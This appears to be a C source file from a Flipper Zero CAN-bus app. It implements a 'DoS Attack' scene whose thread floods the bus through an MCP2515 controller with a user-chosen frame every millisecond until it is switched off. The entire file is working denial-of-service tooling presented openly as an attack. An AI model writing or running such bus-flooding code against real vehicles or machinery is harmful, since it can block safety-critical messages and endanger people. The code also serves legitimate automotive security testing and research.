#include "../app_user.h"

static bool dos_running = false;
static FuriThread* dos_thread = NULL;

static void attack_dos_button_callback(GuiButtonType type, InputType input, void* context);
static void draw_attack_dos_scene(App* app);
static int32_t thread_attack_dos(void* context);

static void attack_dos_button_callback(GuiButtonType type, InputType input, void* context) {
    if(type != GuiButtonTypeCenter || input != InputTypeShort) return;
    App* app = context;

    if(!dos_running) {
        dos_thread = furi_thread_alloc_ex("DoS Attack", 1024, thread_attack_dos, app);
        furi_thread_start(dos_thread);
        dos_running = true;
    } else {
        if(dos_thread) {
            dos_running = false;
            furi_thread_join(dos_thread);
            furi_thread_free(dos_thread);
            dos_thread = NULL;
        }
    }
    draw_attack_dos_scene(app);
}

static void attack_dos_edit_callback(GuiButtonType type, InputType input, void* context) {
    if(type == GuiButtonTypeRight && input == InputTypeShort) {
        App* app = context;
        scene_manager_next_scene(app->scene_manager, app_scene_attack_dos_edit_frame);
    }
}

static void attack_dos_edit_id_callback(GuiButtonType type, InputType input, void* context) {
    if(type == GuiButtonTypeLeft && input == InputTypeShort) {
        App* app = context;
        scene_manager_next_scene(app->scene_manager, app_scene_attack_dos_edit_id);
    }
}

static void draw_attack_dos_scene(App* app) {
    widget_reset(app->widget);

    widget_add_string_element(
        app->widget, 64, 20, AlignCenter, AlignCenter, FontPrimary, "DoS Attack");
    widget_add_string_element(
        app->widget,
        64,
        34,
        AlignCenter,
        AlignCenter,
        FontSecondary,
        dos_running ? "Attack in progress..." : "Ready to start");

    widget_add_button_element(
        app->widget, GuiButtonTypeRight, "Edit PL", attack_dos_edit_callback, app);
    widget_add_button_element(
        app->widget, GuiButtonTypeLeft, "Edit ID", attack_dos_edit_id_callback, app);

    widget_add_button_element(
        app->widget,
        GuiButtonTypeCenter,
        dos_running ? "OFF" : "ON",
        attack_dos_button_callback,
        app);

    view_dispatcher_switch_to_view(app->view_dispatcher, ViewWidget);
}

void app_scene_attack_dos_on_enter(void* context) {
    App* app = context;
    dos_running = false;
    draw_attack_dos_scene(app);
}

bool app_scene_attack_dos_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}

void app_scene_attack_dos_on_exit(void* context) {
    App* app = context;
    if(dos_thread && dos_running) {
        dos_running = false;
        furi_thread_join(dos_thread);
        furi_thread_free(dos_thread);
        dos_thread = NULL;
    }
    widget_reset(app->widget);
}

static int32_t thread_attack_dos(void* context) {
    App* app = context;
    MCP2515* mcp_can = app->mcp_can;
    mcp_can->mode = MCP_NORMAL;

    if(mcp2515_init(mcp_can) != ERROR_OK) {
        draw_device_no_connected(app);
        return 0;
    }

    CANFRAME* frame = app->frame_to_send;
    //frame->canId = 0x000;
    frame->ext = 0;
    frame->req = 0;
    frame->data_lenght = 8;

    furi_hal_light_set(LightGreen, 0);
    furi_hal_light_blink_start(LightRed, 255, 20, 60);

    while(dos_running) {
        send_can_frame(mcp_can, frame);
        furi_delay_ms(1);
    }

    furi_hal_light_blink_stop();
    furi_hal_light_set(LightGreen, 255);
    deinit_mcp2515(mcp_can);
    return 0;
}
